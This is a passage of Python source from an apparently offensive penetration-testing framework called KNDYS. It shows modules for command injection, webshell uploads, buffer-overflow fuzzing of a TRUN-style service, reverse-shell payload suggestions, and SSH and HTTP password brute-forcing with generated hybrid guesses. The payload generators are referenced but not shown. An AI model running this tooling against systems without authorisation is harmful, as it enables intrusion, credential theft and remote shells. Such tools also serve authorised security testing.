            fh.write(f"OS Profile: {profile['os_profile']}\n")
            fh.write(f"Parameters: {profile['parameters']}\n")
            fh.write(f"Attack modes: {', '.join(profile['attack_modes'])}\n")
            fh.write(f"Requests planned: {requests_planned}\n")
            fh.write(f"Duration: {duration:.2f}s\n")
            fh.write(f"Findings: {len(findings)}\n")
            fh.write(f"Errors: {len(errors)}\n\n")
            if findings:
                fh.write("Findings\n")
                fh.write("-" * 40 + "\n")
                for finding in findings:
                    fh.write(f"[{finding.severity}] param={finding.parameter} via {finding.payload_name} ({finding.location})\n")
                    fh.write(f"Indicator: {finding.indicator} | Status {finding.status_code} | {finding.elapsed:.2f}s\n")
                    fh.write(f"Evidence: {finding.evidence}\n")
                    fh.write(f"Payload: {finding.payload}\n")
                    fh.write(f"Marker: {finding.marker}\n\n")
            if errors:
                fh.write("Errors / Warnings\n")
                fh.write("-" * 40 + "\n")
                for entry in errors:
                    fh.write(f"- {entry.get('error')}\n")
        return [json_path, txt_path]

    def _recommend_reverse_shells(self, os_profile):
        if not hasattr(self, 'payload_gen') or not self.payload_gen:
            return []
        lhost = self.config.get('lhost', '127.0.0.1')
        lport = str(self.config.get('lport', 4444))
        recommendations = []
        if os_profile == 'windows':
            payload = self.payload_gen.generate('reverse_shell', 'powershell', LHOST=lhost, LPORT=lport)
            if payload:
                recommendations.append(f"PowerShell: {payload[:120]}...")
        else:
            payload = self.payload_gen.generate('reverse_shell', 'bash', LHOST=lhost, LPORT=lport)
            if payload:
                recommendations.append(f"Bash: {payload}")
        return recommendations

    def run_command_injection(self):
        """High-fidelity command injection exploitation"""
        profile = self._resolve_command_injection_profile()
        if not profile:
            return
        print(f"{Fore.CYAN}[*] Preparing command injection workflow for {profile['url']}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Attack modes: {', '.join(profile['attack_modes'])} | OS profile: {profile['os_profile']}{Style.RESET_ALL}")
        scanner = AdvancedCommandInjectionScanner(profile, self)
        result = scanner.execute()
        findings = result['findings']
        errors = result['errors']
        duration = result['duration']
        requests_planned = result['requests']
        profile_view = dict(profile)
        resolved_params = result.get('parameters') or []
        if resolved_params:
            profile_view['parameters'] = ','.join(resolved_params)
        self._display_command_injection_results(profile_view, findings, errors, duration, requests_planned)
        report_paths = self._export_command_injection_results(profile_view, findings, errors, duration, requests_planned)
        print(f"\n{Fore.GREEN}[+] Command injection reports saved:{Style.RESET_ALL}")
        for path in report_paths:
            print(f" • {path}")

    def _resolve_file_upload_profile(self):
        opts = self.module_options
        url = (opts.get('url') or '').strip()
        if not url:
            print(f"{Fore.RED}[!] File upload module requires a target URL{Style.RESET_ALL}")
            return None
        method = (opts.get('method', 'post') or 'post').lower()
        if method not in {'post', 'put'}:
            method = 'post'
        parameter = (opts.get('parameter', 'file') or 'file').strip() or 'file'
        extra_fields = dict(parse_qsl(opts.get('extra_fields', ''), keep_blank_values=True))
        payload_profile = (opts.get('payload_profile', 'balanced') or 'balanced').lower()
        if payload_profile not in {'stealth', 'balanced', 'aggressive'}:
            payload_profile = 'balanced'
        webshell_type = (opts.get('webshell_type', 'php') or 'php').lower()
        max_payloads = self._safe_int(opts.get('max_payloads'), 6, 1, 24)
        verify_paths_raw = (opts.get('verify_paths', 'auto') or 'auto').strip()
        if verify_paths_raw.lower() == 'auto':
            verify_paths = 'auto'
        else:
            verify_paths = [entry.strip() for entry in verify_paths_raw.split(',') if entry.strip()]
        auto_shell_verify = self._parse_bool_option(opts.get('auto_shell_verify', 'true'), True)
        shell_param = (opts.get('shell_param', 'cmd') or 'cmd').strip() or 'cmd'
        shell_command = (opts.get('shell_command', 'id') or 'id').strip() or 'id'
        shell_success_indicators = [item.strip() for item in (opts.get('shell_success_indicators', 'uid=,www-data,nt authority') or '').split(',') if item.strip()]
        if not shell_success_indicators:
            shell_success_indicators = ['uid=', 'www-data']
        success_keywords = [item.strip() for item in (opts.get('success_keywords', 'upload success,file uploaded,saved to,stored at') or '').split(',') if item.strip()]
        allow_status = []
        for value in (opts.get('allow_status', '200,201,202,204,302') or '').split(','):
            try:
                allow_status.append(int(value.strip()))
            except (ValueError, TypeError):
                continue
        if not allow_status:
            allow_status = [200, 201, 202, 204, 302]
        threads = self._safe_int(opts.get('threads'), 4, 1, 16)
        timeout = self._safe_float(opts.get('timeout'), 12.0, 2.0, 120.0)
        verify_timeout = self._safe_float(opts.get('verify_timeout'), 6.0, 1.0, 60.0)
        throttle = self._safe_float(opts.get('throttle'), 0.0, 0.0, 5.0)
        verify_ssl = self._parse_bool_option(opts.get('verify_ssl', 'false'), False)
        rate_limit_value = float(opts.get('rate_limit', '0') or 0)
        rate_limiter = None
        if rate_limit_value > 0:
            rate_limiter = RateLimiter(max_requests=max(1, int(rate_limit_value)), time_window=1)
        headers = {
            'User-Agent': self.config.get('user_agent', 'KNDYS-FileUpload'),
            'Accept': '*/*'
        }
        headers.update(self._build_header_map(opts.get('custom_headers', '')))
        cookies = self._build_cookie_map(opts.get('cookies', ''))
        proxies = self._build_proxy_map(opts.get('proxies', ''))
        profile = {
            'url': url,
            'method': method,
            'parameter': parameter,
            'extra_fields': extra_fields,
            'payload_profile': payload_profile,
            'custom_payload': opts.get('custom_payload', ''),
            'webshell_type': webshell_type,
            'max_payloads': max_payloads,
            'verify_paths': verify_paths,
            'auto_shell_verify': auto_shell_verify,
            'shell_param': shell_param,
            'shell_command': shell_command,
            'shell_success_indicators': shell_success_indicators,
            'success_keywords': success_keywords or ['upload success'],
            'allow_status': allow_status,
            'threads': threads,
            'timeout': timeout,
            'verify_timeout': verify_timeout,
            'throttle': throttle,
            'verify_ssl': verify_ssl,
            'rate_limiter': rate_limiter,
            'headers': headers,
            'cookies': cookies,
            'proxies': proxies,
            'report_prefix': opts.get('report_prefix', 'file_upload') or 'file_upload'
        }
        return profile

    def _display_file_upload_results(self, profile, result):
        payloads = result['payloads']
        findings = result['findings']
        errors = result['errors']
        duration = result['duration']
        requests_made = result['requests']
        print(f"\n{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}FILE UPLOAD SUMMARY{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Target : {Fore.CYAN}{profile['url']}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Payloads crafted : {Fore.CYAN}{len(payloads)}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Requests issued : {Fore.CYAN}{requests_made}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Findings : {Fore.GREEN}{len(findings)}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Errors : {Fore.YELLOW}{len(errors)}{Style.RESET_ALL}")
        if duration:
            print(f"{Fore.WHITE} Duration : {Fore.CYAN}{duration:.2f}s{Style.RESET_ALL}")
        if payloads:
            preview = ', '.join(payload.name for payload in payloads[:5])
            print(f"{Fore.WHITE} Payload preview : {Fore.CYAN}{preview}{Style.RESET_ALL}")
        if findings:
            print(f"\n{Fore.GREEN}[+] Confirmed upload exposure{Style.RESET_ALL}")
            for finding in findings[:5]:
                print(f" {Fore.YELLOW}{finding.severity:<9}{Style.RESET_ALL} payload={finding.payload_name:<12} vector={finding.vector:<10} verification={finding.verification}")
                if finding.access_url:
                    print(f" URL: {finding.access_url}")
                print(f" Evidence: {finding.evidence[:90]}")
        if errors:
            print(f"\n{Fore.YELLOW}[!] Warnings / errors{Style.RESET_ALL}")
            for entry in errors[:5]:
                print(f" - {entry.get('error')}")

    def _export_file_upload_results(self, profile, result):
        timestamp = int(time.time())
        host = urlparse(profile['url']).netloc.replace(':', '_') or 'target'
        base_name = f"{profile['report_prefix']}_{host}_{timestamp}"
        json_path = f"{base_name}.json"
        txt_path = f"{base_name}_report.txt"
        payload_snapshot = [
            {
                'name': payload.name,
                'filename': payload.filename,
                'vector': payload.vector,
                'description': payload.description,
                'exec_capable': payload.exec_capable
            }
            for payload in result['payloads']
        ]
        data = {
            'target': profile['url'],
            'payload_profile': profile['payload_profile'],
            'payloads': payload_snapshot,
            'findings': [finding.__dict__ for finding in result['findings']],
            'errors': result['errors'],
            'duration': result['duration'],
            'requests': result['requests'],
            'timestamp': timestamp
        }
        with open(json_path, 'w', encoding='utf-8') as fh:
            json.dump(data, fh, indent=2)
        with open(txt_path, 'w', encoding='utf-8') as fh:
            fh.write("=" * 78 + "\n")
            fh.write("KNDYS FILE UPLOAD REPORT\n")
            fh.write("=" * 78 + "\n\n")
            fh.write(f"Target: {profile['url']}\n")
            fh.write(f"Payload profile: {profile['payload_profile']}\n")
            fh.write(f"Payloads generated: {len(result['payloads'])}\n")
            fh.write(f"Findings: {len(result['findings'])}\n")
            fh.write(f"Errors: {len(result['errors'])}\n")
            fh.write(f"Duration: {result['duration']:.2f}s\n")
            fh.write(f"Requests: {result['requests']}\n\n")
            if result['findings']:
                fh.write("Findings\n")
                fh.write("-" * 40 + "\n")
                for finding in result['findings']:
                    fh.write(f"[{finding.severity}] payload={finding.payload_name} vector={finding.vector}\n")
                    fh.write(f"Indicator : {finding.indicator}\n")
                    fh.write(f"Verification: {finding.verification}\n")
                    if finding.access_url:
                        fh.write(f"Access URL : {finding.access_url}\n")
                    fh.write(f"Evidence : {finding.evidence}\n\n")
            if result['errors']:
                fh.write("Errors / Warnings\n")
                fh.write("-" * 40 + "\n")
                for entry in result['errors']:
                    fh.write(f"- {entry.get('error')}\n")
        return [json_path, txt_path]

    def run_file_upload(self):
        """Advanced file upload exploitation"""
        profile = self._resolve_file_upload_profile()
        if not profile:
            return
        tester = AdvancedFileUploadTester(profile, self)
        result = tester.execute()
        self._display_file_upload_results(profile, result)
        report_paths = self._export_file_upload_results(profile, result)
        if report_paths:
            print(f"\n{Fore.GREEN}[+] File upload reports saved:{Style.RESET_ALL}")
            for path in report_paths:
                print(f" • {path}")
    
    def _resolve_buffer_overflow_profile(self):
        opts = self.module_options
        target = (opts.get('target') or '127.0.0.1:9999').strip()
        host = target
        port = 9999
        if ':' in target:
            parts = target.rsplit(':', 1)
            host = parts[0]
            try:
                port = int(parts[1])
            except ValueError:
                print(f"{Fore.RED}[!] Invalid port specified for buffer overflow target{Style.RESET_ALL}")
                return None
        protocol = (opts.get('protocol', 'tcp') or 'tcp').strip().lower()
        if protocol not in {'tcp', 'udp'}:
            protocol = 'tcp'
        raw_strategy = (opts.get('payload_strategy', 'progressive,cyclic') or 'progressive').strip().lower()
        payload_strategy = [entry.strip() for entry in raw_strategy.split(',') if entry.strip()]
        if not payload_strategy:
            payload_strategy = ['progressive']
        start_length = self._safe_int(opts.get('start_length'), 256, 16, 20000)
        max_length = self._safe_int(opts.get('max_length'), 4096, start_length, 100000)
        step_length = self._safe_int(opts.get('step_length'), 256, 16, max_length)
        cyclic_length = self._safe_int(opts.get('cyclic_length'), 2048, 64, max_length)
        max_payloads = self._safe_int(opts.get('max_payloads'), 12, 0, 256)
        custom_lengths = []
        for token in (opts.get('custom_lengths', '') or '').split(','):
            token = token.strip()
            if not token:
                continue
            try:
                custom_lengths.append(max(1, int(token)))
            except ValueError:
                continue
        custom_payloads_raw = (opts.get('custom_payloads', '') or '')
        custom_payloads_raw = custom_payloads_raw.replace('|||', '\n')
        custom_payloads_raw = custom_payloads_raw.replace('||', '\n')
        custom_payloads = [line.strip() for line in custom_payloads_raw.split('\n') if line.strip()]
        if custom_lengths and 'custom-lengths' not in payload_strategy:
            payload_strategy.append('custom-lengths')
        if custom_payloads and 'custom-payloads' not in payload_strategy:
            payload_strategy.append('custom-payloads')
        command_template = opts.get('command_template', 'TRUN /.:/{{PAYLOAD}}\\r\\n') or '{{PAYLOAD}}'
        encoding = (opts.get('encoding', 'latin-1') or 'latin-1').strip()
        connection_timeout = self._safe_float(opts.get('connection_timeout'), 3.0, 0.5, 30.0)
        response_timeout = self._safe_float(opts.get('response_timeout'), 3.0, 0.5, 30.0)
        settle_delay = self._safe_float(opts.get('settle_delay'), 0.8, 0.0, 5.0)
        max_retries = self._safe_int(opts.get('max_retries'), 1, 0, 5)
        crash_tokens = [token.strip().lower() for token in (opts.get('crash_indicators', 'connection reset,connection closed,no response') or '').split(',') if token.strip()]
        if not crash_tokens:
            crash_tokens = ['connection reset', 'no response']
        stop_on_crash = self._parse_bool_option(opts.get('stop_on_crash', 'true'), True)
        offset_value = (opts.get('offset_value', '') or '').strip()
        threads = self._safe_int(opts.get('threads'), 1, 1, 8)
        profile = {
            'target': target,
            'host': host,
            'port': port,
            'protocol': protocol,
            'payload_strategy': payload_strategy,
            'start_length': start_length,
            'max_length': max_length,
            'step_length': step_length,
            'cyclic_length': cyclic_length,
            'max_payloads': max_payloads,
            'custom_lengths': custom_lengths,
            'custom_payloads': custom_payloads,
            'command_template': command_template,
            'encoding': encoding,
            'connection_timeout': connection_timeout,
            'response_timeout': response_timeout,
            'settle_delay': settle_delay,
            'max_retries': max_retries,
            'crash_indicators': crash_tokens,
            'stop_on_crash': stop_on_crash,
            'offset_value': offset_value,
            'threads': threads,
            'report_prefix': opts.get('report_prefix', 'buffer_overflow') or 'buffer_overflow'
        }
        return profile

    def _display_buffer_overflow_results(self, profile, result):
        payloads = result['payloads']
        findings = result['findings']
        errors = result['errors']
        duration = result['duration']
        requests = result['requests']
        print(f"\n{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}BUFFER OVERFLOW SUMMARY{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Target : {Fore.CYAN}{profile['target']}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Payloads prepared : {Fore.CYAN}{len(payloads)}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Requests issued : {Fore.CYAN}{requests}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Findings detected : {Fore.GREEN}{len(findings)}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Errors logged : {Fore.YELLOW}{len(errors)}{Style.RESET_ALL}")
        if duration:
            print(f"{Fore.WHITE} Duration : {Fore.CYAN}{duration:.2f}s{Style.RESET_ALL}")
        if payloads:
            preview = ', '.join(payload.name for payload in payloads[:5])
            print(f"{Fore.WHITE} Payload preview : {Fore.CYAN}{preview}{Style.RESET_ALL}")
        if result.get('offset_hint') is not None:
            print(f"{Fore.WHITE} Offset hint : {Fore.CYAN}{result['offset_hint']} byte(s){Style.RESET_ALL}")
        if findings:
            print(f"\n{Fore.GREEN}[+] Indicators{Style.RESET_ALL}")
            for finding in findings[:5]:
                crash_flag = 'CRASH' if finding.crash else 'INFO'
                print(f" {Fore.YELLOW}{finding.payload_name:<18}{Style.RESET_ALL} len={finding.length:<5} indicator={finding.indicator} ({crash_flag})")
                if finding.evidence:
                    print(f" Evidence: {finding.evidence[:90]}")
        if errors:
            print(f"\n{Fore.YELLOW}[!] Errors / warnings{Style.RESET_ALL}")
            for entry in errors[:5]:
                print(f" - {entry.get('error')}")

    def _export_buffer_overflow_results(self, profile, result):
        timestamp = int(time.time())
        host = profile['host'].replace(':', '_') or 'target'
        base_name = f"{profile['report_prefix']}_{host}_{timestamp}"
        json_path = f"{base_name}.json"
        txt_path = f"{base_name}_report.txt"
        data = {
            'target': profile['target'],
            'payload_strategy': profile['payload_strategy'],
            'payloads': [
                {
                    'name': payload.name,
                    'length': payload.length,
                    'vector': payload.vector,
                    'cyclic': payload.cyclic
                } for payload in result['payloads']
            ],
            'findings': [finding.__dict__ for finding in result['findings']],
            'errors': result['errors'],
            'duration': result['duration'],
            'requests': result['requests'],
            'offset_hint': result.get('offset_hint'),
            'timestamp': timestamp
        }
        with open(json_path, 'w', encoding='utf-8') as fh:
            json.dump(data, fh, indent=2)
        with open(txt_path, 'w', encoding='utf-8') as fh:
            fh.write("=" * 78 + "\n")
            fh.write("KNDYS BUFFER OVERFLOW REPORT\n")
            fh.write("=" * 78 + "\n\n")
            fh.write(f"Target: {profile['target']}\n")
            fh.write(f"Payload strategy: {', '.join(profile['payload_strategy'])}\n")
            fh.write(f"Payloads generated: {len(result['payloads'])}\n")
            fh.write(f"Findings: {len(result['findings'])}\n")
            fh.write(f"Errors: {len(result['errors'])}\n")
            fh.write(f"Duration: {result['duration']:.2f}s\n")
            fh.write(f"Requests: {result['requests']}\n")
            if result.get('offset_hint') is not None:
                fh.write(f"Offset hint: {result['offset_hint']} byte(s)\n")
            fh.write("\n")
            if result['findings']:
                fh.write("Findings\n")
                fh.write("-" * 40 + "\n")
                for finding in result['findings']:
                    fh.write(f"[{finding.severity}] payload={finding.payload_name} length={finding.length}\n")
                    fh.write(f"Indicator : {finding.indicator}\n")
                    fh.write(f"Evidence : {finding.evidence}\n")
                    fh.write(f"Crash : {finding.crash}\n\n")
            if result['errors']:
                fh.write("Errors / Warnings\n")
                fh.write("-" * 40 + "\n")
                for entry in result['errors']:
                    fh.write(f"- {entry.get('error')}\n")
        return [json_path, txt_path]

    def run_buffer_overflow(self):
        """Advanced buffer overflow exploitation workflow"""
        profile = self._resolve_buffer_overflow_profile()
        if not profile:
            return
        print(f"{Fore.CYAN}[*] Buffer overflow testing: {profile['target']} ({profile['protocol'].upper()}){Style.RESET_ALL}")
        tester = AdvancedBufferOverflowTester(profile, self)
        result = tester.execute()
        self._display_buffer_overflow_results(profile, result)
        report_paths = self._export_buffer_overflow_results(profile, result)
        if report_paths:
            print(f"\n{Fore.GREEN}[+] Buffer overflow reports saved:{Style.RESET_ALL}")
            for path in report_paths:
                print(f" • {path}")
    
    # ============ PASSWORD ATTACK MODULES ============
    
    def run_brute_force(self):
        """High-performance, defensive-minded brute force orchestrator."""
        profile = self._resolve_brute_force_profile()
        if not profile:
            return None
        usernames, passwords = self._load_brute_force_lists(profile)
        combinations = self._build_brute_force_combos(usernames, passwords, profile)
        if not combinations:
            print(f"{Fore.RED}[!] No credential combinations available; adjust dictionaries or limits.{Style.RESET_ALL}")
            return None
        try:
            connector = self._get_brute_force_connector(profile)
        except RuntimeError as exc:
            print(f"{Fore.RED}[!] {exc}{Style.RESET_ALL}")
            return None
        except Exception as exc:
            self.error_handler.handle_error(exc, "Initializing brute force connector")
            return None
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}BRUTE FORCE MODULE{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Service : {Fore.CYAN}{profile['service'].upper()}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Target : {Fore.CYAN}{profile['target']}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Usernames : {Fore.CYAN}{len(usernames)}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Passwords : {Fore.CYAN}{len(passwords)}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Combinations : {Fore.CYAN}{len(combinations)}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Concurrency : {Fore.CYAN}{profile['concurrency']} worker(s){Style.RESET_ALL}")
        print(f"{Fore.WHITE} Delay/Jitter : {Fore.CYAN}{profile['delay']}s / {profile['jitter']}s{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Stop on success: {Fore.CYAN}{profile['stop_on_success']}{Style.RESET_ALL}\n")
        result = self._execute_brute_force(profile, connector, combinations)
        if hasattr(connector, 'close'):
            connector.close()
        self._display_brute_force_summary(profile, result)
        report_paths = self._export_brute_force_results(profile, result)
        if report_paths:
            print(f"\n{Fore.GREEN}[+] Brute force reports saved:{Style.RESET_ALL}")
            for path in report_paths:
                print(f" • {path}")
        if not result['successes']:
            print(f"{Fore.YELLOW}[*] No valid passwords identified. Consider adjusting scope or lists.{Style.RESET_ALL}")
        return result

    def _resolve_brute_force_profile(self):
        opts = self.module_options
        service = (opts.get('service') or 'ssh').strip().lower()
        if service not in {'ssh', 'http', 'mock'}:
            print(f"{Fore.YELLOW}[!] Unknown service '{service}', defaulting to SSH.{Style.RESET_ALL}")
            service = 'ssh'
        target = (opts.get('target') or self.config.get('rhost') or '').strip()
        host = target or '127.0.0.1'
        port = 22
        if service == 'ssh':
            if ':' in target:
                host, raw_port = target.rsplit(':', 1)
                port = self._safe_int(raw_port, 22, 1, 65535)
            if not host:
                print(f"{Fore.RED}[!] SSH target required. Set 'target' option.{Style.RESET_ALL}")
                return None
            target_descriptor = f"{host}:{port}"
        elif service == 'http':
            if not target or not self.validator.validate_url(target):
                print(f"{Fore.RED}[!] Provide a valid http(s) URL via 'target'.{Style.RESET_ALL}")
                return None
            target_descriptor = target
        else:
            target_descriptor = target or 'mock-target'
            host = 'mock-target'
            port = 0
        concurrency = self._safe_int(opts.get('concurrency') or opts.get('threads') or 4, 4, 1, 32)
        delay = self._safe_float(opts.get('delay'), 0.2, 0.0, 5.0)
        jitter = self._safe_float(opts.get('jitter'), 0.03, 0.0, 1.0)
        max_attempts = self._safe_int(opts.get('max_attempts'), 2048, 1, 200000)
        max_runtime = self._safe_float(opts.get('max_runtime'), 240.0, 10.0, 7200.0)
        lockout_threshold = self._safe_int(opts.get('lockout_threshold'), 5, 1, 50)
        usernames_limit = self._safe_int(opts.get('max_usernames'), 32, 1, 256)
        passwords_limit = self._safe_int(opts.get('max_passwords'), 512, 1, 10000)
        combo_limit = self._safe_int(opts.get('combo_limit') or opts.get('attempt_limit') or max_attempts, max_attempts, 1, 300000)
        stop_on_success = self._parse_bool_option(opts.get('stop_on_success', 'true'), True)
        enable_hybrids = self._parse_bool_option(opts.get('hybrid', 'true'), True)
        audit_log = opts.get('audit_log', f"bruteforce_{getattr(self, 'session_id', 'session')}_audit.log")
        password_profile = (opts.get('password_profile') or 'core').strip().lower()
        username_profile = (opts.get('username_profile') or 'core').strip().lower()

        profile = {
            'service': service,
            'target': target_descriptor,
            'host': host,
            'port': port,
            'session_id': getattr(self, 'session_id', 'session'),
            'username': (opts.get('username') or '').strip(),
            'usernames_file': (opts.get('usernames') or '').strip(),
            'usernames_inline': opts.get('usernames_inline', ''),
            'passwords_file': (opts.get('passwords') or opts.get('wordlist') or '').strip(),
            'passwords_inline': opts.get('passwords_inline', ''),
            'max_usernames': usernames_limit,
            'max_passwords': passwords_limit,
            'combo_limit': min(combo_limit, max_attempts),
            'password_profile': password_profile,
            'username_profile': username_profile,
            'concurrency': concurrency,
            'delay': delay,
            'jitter': jitter,
            'max_attempts': max_attempts,
            'max_runtime': max_runtime,
            'lockout_threshold': lockout_threshold,
            'stop_on_success': stop_on_success,
            'telemetry_tail': self._safe_int(opts.get('telemetry_tail'), 12, 3, 50),
            'enable_hybrids': enable_hybrids,
            'hybrid_limit': self._safe_int(opts.get('hybrid_limit'), 8, 1, 64),
            'hybrid_year': self._safe_int(opts.get('hybrid_year'), datetime.now().year, 1990, 2100),
            'error_backoff': self._safe_float(opts.get('error_backoff'), 0.4, 0.0, 5.0),
            'audit_log': audit_log,
            'ssh_command': opts.get('ssh_command', 'whoami'),
            'ssh_timeout': self._safe_float(opts.get('ssh_timeout'), 8.0, 2.0, 60.0),
            'http_method': (opts.get('http_method', 'post') or 'post').strip().lower(),
            'http_success_indicators': [token.lower() for token in self._parse_list_option(opts.get('success_indicators', 'welcome,dashboard,logout,success'))] or ['welcome'],
            'http_success_codes': [self._safe_int(code, 0, 0, 999) for code in self._parse_list_option(opts.get('success_codes', '200,302'))],
            'http_lockout_codes': [self._safe_int(code, 0, 0, 999) for code in self._parse_list_option(opts.get('lockout_codes', '401,403,429'))],
            'http_lockout_indicators': [token.lower() for token in self._parse_list_option(opts.get('lockout_indicators', 'locked,too many attempts,try later'))],
            'http_username_field': opts.get('username_field', 'username'),
            'http_password_field': opts.get('password_field', 'password'),
            'http_extra_fields': self._parse_key_value_options(opts.get('http_extra_fields')),
            'http_headers': self._parse_key_value_options(opts.get('http_headers')),
            'http_format': (opts.get('http_format', 'form') or 'form').strip().lower(),
            'http_verify': self._parse_bool_option(opts.get('http_verify', 'false'), False),
            'http_timeout': self._safe_float(opts.get('http_timeout'), 10.0, 2.0, 60.0),
            'http_allow_redirects': self._parse_bool_option(opts.get('http_allow_redirects', 'true'), True),
            'mock_success_password': opts.get('mock_success_password', 'letmein'),
            'mock_valid_pairs': self._parse_key_value_options(opts.get('mock_valid_pairs')),
            'mock_lockout_after': self._safe_int(opts.get('mock_lockout_after'), 0, 0, 10)
        }
        if profile['http_method'] not in {'post', 'get'}:
            profile['http_method'] = 'post'
        return profile

    def _parse_key_value_options(self, raw_value):
        entries = {}
        for token in self._parse_list_option(raw_value):
            if '=' in token:
                key, value = token.split('=', 1)
            elif ':' in token:
                key, value = token.split(':', 1)
            else:
                continue
            key = key.strip()
            value = value.strip()
            if key:
                entries[key] = value
        return entries

    def _load_brute_force_lists(self, profile):
        wordlists = getattr(self, 'wordlists', {'passwords': [], 'usernames': []})
        builtin_usernames = self._get_profile_entries('username_profiles', profile.get('username_profile'), wordlists.get('usernames', []))
        builtin_passwords = self._get_profile_entries('password_profiles', profile.get('password_profile'), wordlists.get('passwords', []))
        usernames = []
        if profile['username']:
            usernames.append(profile['username'])
        usernames.extend(self._parse_list_option(profile['usernames_inline']))
        if profile['usernames_file']:
            usernames.extend(self._load_wordlist_entries(profile['usernames_file'], builtin_usernames, 'username', profile['max_usernames']))
        if not usernames:
            usernames = builtin_usernames[:profile['max_usernames']]
        usernames = self._dedupe_preserve_order(usernames)[:profile['max_usernames']]
        passwords = []
        passwords.extend(self._parse_list_option(profile['passwords_inline']))
        if profile['passwords_file']:
            passwords.extend(self._load_wordlist_entries(profile['passwords_file'], builtin_passwords, 'password', profile['max_passwords']))
        if not passwords:
            passwords = builtin_passwords[:profile['max_passwords']]
        passwords = self._augment_password_candidates(usernames, passwords, profile)
        return usernames, passwords[:profile['max_passwords']]

    def _load_wordlist_entries(self, option_value, builtin, kind, limit):
        entries = []
        resolved = None
        option_value = (option_value or '').strip()
        if option_value:
            resolved = self.resolve_wordlist_path(option_value, kind)
            if not resolved and os.path.exists(option_value):
                resolved = option_value
            if resolved:
                try:
                    with open(resolved, 'r', encoding='utf-8', errors='ignore') as fh:
                        for line in fh:
                            line = line.strip()
                            if line:
                                entries.append(line)
                            if len(entries) >= limit:
                                break
                except (OSError, UnicodeError) as exc:
                    self.error_handler.handle_error(exc, f"Reading {kind} wordlist")
            elif not self.find_wordlist_entry(option_value, kind):
                print(f"{Fore.YELLOW}[!] {kind.title()} wordlist '{option_value}' not found; using built-in fallback.{Style.RESET_ALL}")
        if not entries and builtin:
            entries = list(builtin)[:limit]
        return entries

    def _augment_password_candidates(self, usernames, base_passwords, profile):
        if not profile['enable_hybrids']:
            return self._dedupe_preserve_order(base_passwords)
        hybrids = []
        year = profile['hybrid_year']
        for name in usernames[:profile['hybrid_limit']]:
            clean = re.sub(r'[^A-Za-z0-9]', '', name)
            if not clean:
                continue
            lower = clean.lower()
            hybrids.extend([
                f"{lower}123",
                f"{lower}!",
                f"{lower}{year}",
                f"{clean.capitalize()}!",
                f"{clean.capitalize()}{year % 100:02d}"
            ])
        candidates = base_passwords + hybrids
        return self._dedupe_preserve_order(candidates)

    @staticmethod
    def _dedupe_preserve_order(items):
        seen = set()
        cleaned = []
        for item in items:
            token = (item or '').strip()
            if not token:
                continue
            key = token.lower()
            if key in seen:
                continue
            seen.add(key)
            cleaned.append(token)
        return cleaned

    @staticmethod
    def _sleep_with_jitter(base_delay, jitter):
        if base_delay <= 0 and jitter <= 0:
            return
        effective = base_delay
        if jitter:
            effective += random.uniform(-abs(jitter), abs(jitter))
        if effective > 0:
            time.sleep(effective)

    def _build_brute_force_combos(self, usernames, passwords, profile):
        combos = []
        limit = min(profile['combo_limit'], profile['max_attempts'])
        for username in usernames:
            for password in passwords:
                combos.append((username, password))
                if len(combos) >= limit:
                    return combos
        return combos

    def _get_brute_force_connector(self, profile):
        connector_map = {
            'ssh': SSHBruteForceConnector,
            'http': HTTPBruteForceConnector,
            'mock': MockBruteForceConnector
        }
        connector_cls = connector_map.get(profile['service'])
        if not connector_cls:
            raise RuntimeError(f"Service '{profile['service']}' is not supported")
        connector = connector_cls(self)
        connector.prepare(profile)
        return connector

    def _execute_brute_force(self, profile, connector, combos):
        start_time = time.time()
        successes = []
        errors = []
        lockouts = {}
        attempt_log = deque(maxlen=profile['telemetry_tail'])
        locked_users = set()
        failure_counts = Counter()
        total_attempts = 0
        aborted_reason = None
        chunk_size = profile['concurrency']
        combos_iter = iter(combos)
        with concurrent.futures.ThreadPoolExecutor(max_workers=profile['concurrency']) as executor:
            while True:
                if profile['stop_on_success'] and successes:
                    aborted_reason = 'success'
                    break
                if total_attempts >= profile['max_attempts']:
                    aborted_reason = 'max_attempts'
                    break
                if time.time() - start_time >= profile['max_runtime']:
                    aborted_reason = 'max_runtime'
                    break
                chunk = []
                while len(chunk) < chunk_size:
                    try:
                        username, password = next(combos_iter)
                    except StopIteration:
                        break
                    if username in locked_users:
                        continue
                    chunk.append((username, password))
                if not chunk:
                    break
                futures = []
                for username, password in chunk:
                    futures.append((executor.submit(self._attempt_brute_force_credential, connector, profile, username, password, total_attempts + 1), username, password))
                for future, username, password in futures:
                    if profile['stop_on_success'] and successes:
                        break
                    try:
                        outcome = future.result()
                    except Exception as exc:
                        self.error_handler.handle_error(exc, "Brute force worker")
                        outcome = AttemptOutcome(success=False, error=str(exc))
                    total_attempts += 1
                    attempt_log.append({
                        'username': username,
                        'password': self._mask_secret_fragment(password),
                        'success': outcome.success,
                        'error': outcome.error,
                        'latency': round(outcome.latency, 4)
                    })
                    if outcome.lockout:
                        lockouts[username] = lockouts.get(username, 0) + 1
                        locked_users.add(username)
                    if not outcome.success and not outcome.lockout:
                        failure_counts[username] += 1
                        if failure_counts[username] >= profile['lockout_threshold']:
